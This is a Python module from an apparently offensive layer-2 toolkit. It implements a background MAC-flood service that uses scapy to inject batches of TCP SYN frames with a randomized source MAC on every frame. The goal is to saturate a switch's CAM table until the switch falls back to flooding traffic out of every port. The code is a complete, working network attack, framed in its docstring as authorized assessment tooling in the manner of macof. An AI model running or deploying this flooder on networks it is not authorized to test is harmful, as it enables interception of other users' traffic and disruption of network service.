"""MAC-table saturation traffic generation ("flood") jobs.

The wired counterpart to the wireless beacon-spam service: each ``flood`` starts
an independent background job on one interface that continuously injects Ethernet
frames whose **source MAC is randomized on every packet** (macof-style Ether/IP/
TCP), to test how a switch behaves when its CAM/MAC address table is saturated.

A switch learns which port a MAC lives on from the *source* address of the frames
it forwards; a stream of unique source addresses fills that finite table, and a
switch that can no longer learn typically falls back to flooding frames out every
port - the behaviour this exercises on equipment you are authorized to test.

Jobs are keyed by interface (one flood per interface); several interfaces can run
at once and each is stopped independently. Injection requires root; the CLI gates
the actions. Standard layer-2 security-assessment tooling (cf. ``macof`` from
dsniff) - for use only on networks you are authorized to test.
"""

from __future__ import annotations

import threading
import time
from dataclasses import dataclass
from typing import TYPE_CHECKING

from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether
from scapy.volatile import RandIP, RandMAC, RandShort

from mac_and_seize.core.errors import ModuleError
from mac_and_seize.net.adapters import scapy_io
from mac_and_seize.observability import get_logger

if TYPE_CHECKING:
    from mac_and_seize.core.context import AppContext

#: Frames sent per injection call. scapy re-rolls the template's volatile fields
#: (a fresh random source MAC and the rest) for every frame within one send, so a
#: batch is that many distinct packets. The worker checks for a stop / elapsed
#: duration *between* batches, so this trades raw throughput against how quickly a
#: job reacts to ``stop`` - a batch is a handful of milliseconds on a healthy NIC.
_BATCH = 1000

#: How many consecutive failed sends end a job on their own (e.g. the interface
#: went down mid-run) instead of spinning forever logging.
_MAX_CONSECUTIVE_FAILURES = 20


def _flood_frame():
    """Build one macof-style template frame with per-packet randomized fields.

    The source MAC is a locally-administered *unicast* address (first octet
    ``0x02``) so a switch will actually learn it - a frame whose source has the
    multicast bit set is invalid and would not populate the CAM table. The
    destination MAC and the IP/TCP addressing are fully randomized. Every field is
    a scapy volatile value, re-evaluated per frame when the template is sent with
    a ``count``, so a single template yields a stream of distinct frames.
    """
    return (
        Ether(src=RandMAC("02"), dst=RandMAC())
        / IP(src=RandIP(), dst=RandIP())
        / TCP(sport=RandShort(), dport=RandShort(), flags="S")
    )


@dataclass
class MacFloodJob:
    """One running MAC-flood job (one interface)."""

    iface: str
    duration: float | None
    stop_event: threading.Event
    started_at: float
    thread: threading.Thread | None = None
    task: object | None = None
    sent: int = 0


class MacFloodService:
    """Session-scoped registry of MAC-flood jobs, one per interface."""

    def __init__(self) -> None:
        self._log = get_logger(__name__)
        self._lock = threading.RLock()
        self._jobs: dict[str, MacFloodJob] = {}
        self._context: "AppContext | None" = None

    # --- Public API -----------------------------------------------------------

    def flood(
        self,
        context: "AppContext",
        interface: str,
        *,
        duration: int | None = None,
    ) -> str:
        """Start a background flood on ``interface`` (raises if one is running).

        ``duration`` (seconds) makes the job stop itself; omit it to run until
        ``stop``. Returns immediately - the flood runs in the background and the
        prompt stays usable.
        """
        iface = (interface or "").strip()
        if not iface:
            raise ValueError("Give an interface to generate traffic on.")
        if duration is not None and duration <= 0:
            raise ValueError("--duration must be a positive number of seconds.")

        available = scapy_io.available_interfaces()
        if iface not in available:
            raise ValueError(
                f"Unknown interface {iface!r}. "
                f"Available: {', '.join(available) or 'none'}."
            )

        with self._lock:
            self._reap_locked()
            if iface in self._jobs:
                raise ModuleError(
                    f"A MAC flood is already running on {iface!r}; stop it first."
                )
            self._context = context
            job = MacFloodJob(
                iface=iface,
                duration=float(duration) if duration else None,
                stop_event=threading.Event(),
                started_at=time.monotonic(),
            )
            job.thread = threading.Thread(
                target=self._run,
                args=(job,),
                name=f"lan-mac-flood-{iface}",
                daemon=True,
            )
            job.task = context.tasks.start(
                context.current_command,
                stop=lambda name=iface: self.stop(name),
            )
            self._jobs[iface] = job
            job.thread.start()

        limit = f", stopping after {int(duration)}s" if duration else ""
        return (
            f"MAC flood started on {iface} (randomized source MAC per frame)"
            f"{limit}. Stop it with 'lan mac stop {iface}'."
        )

    def stop(self, interface: str) -> str:
        """Stop the running flood on ``interface`` (raises if none is running).

        Signals the worker and waits for it to wind down, then reports how many
        frames it sent.
        """
        iface = (interface or "").strip()
        with self._lock:
            self._reap_locked()
            job = self._jobs.get(iface)
        if job is None:
            raise ModuleError(f"No MAC flood is running on {iface!r}.")
        self._join_job(job)
        return f"MAC flood on {iface} stopped ({job.sent} frame(s) sent)."

    # --- Worker ---------------------------------------------------------------

    def _run(self, job: MacFloodJob) -> None:
        """Injection loop for one job; always finalizes on exit."""
        deadline = job.started_at + job.duration if job.duration else None
        failures = 0
        error = False
        try:
            while not job.stop_event.is_set():
                if deadline is not None and time.monotonic() >= deadline:
                    break
                try:
                    scapy_io.send_l2(_flood_frame(), job.iface, count=_BATCH)
                    job.sent += _BATCH
                    failures = 0
                except OSError as exc:
                    # Injection can fail transiently (device busy) or hard (the
                    # interface vanished). Debug, not warning - the loop runs hot
                    # and must not flood the interactive prompt.
                    failures += 1
                    self._log.debug(
                        "MAC flood: send on %s failed: %s", job.iface, exc
                    )
                    if failures >= _MAX_CONSECUTIVE_FAILURES:
                        self._log.warning(
                            "MAC flood on %s gave up: %d consecutive send failures.",
                            job.iface, failures,
                        )
                        error = True
                        break
        except Exception:  # noqa: BLE001 - a crashed worker must still finalize
            self._log.exception("MAC flood worker for %s crashed", job.iface)
            error = True
        finally:
            self._finalize(job, error=error)

    def _finalize(self, job: MacFloodJob, *, error: bool) -> None:
        """Drop ``job`` from the registry and report a self-end via notify."""
        with self._lock:
            if self._jobs.get(job.iface) is job:
                del self._jobs[job.iface]

        context = self._context
        if job.task is not None and context is not None:
            context.tasks.finish(job.task)

        # A user-driven stop (stop_event set by stop()) is reported by that
        # command; stay quiet to avoid a duplicate line. A job that ended on its
        # own (duration elapsed, or the interface failed) happened while the user
        # is elsewhere, so surface it via the prompt-safe notify channel.
        if job.stop_event.is_set() or context is None:
            return
        if error:
            context.presenter.notify(
                f"MAC flood on {job.iface} stopped: injection kept failing "
                f"({job.sent} frame(s) sent)."
            )
        else:
            context.presenter.notify(
                f"MAC flood on {job.iface} finished after {int(job.duration or 0)}s "
                f"({job.sent} frame(s) sent)."
            )

    # --- Internals ------------------------------------------------------------

    def _reap_locked(self) -> None:
        """Drop jobs whose worker already exited (defensive: workers self-remove)."""
        dead = [
            iface
            for iface, job in self._jobs.items()
            if job.thread is not None and not job.thread.is_alive()
        ]
        for iface in dead:
            self._jobs.pop(iface, None)

    def _join_job(self, job: MacFloodJob) -> None:
        """Signal ``job`` and wait for its worker (which finalizes) to finish."""
        job.stop_event.set()
        thread = job.thread
        if (
            thread is not None
            and thread.is_alive()
            and thread is not threading.current_thread()
        ):
            thread.join(timeout=3.0)
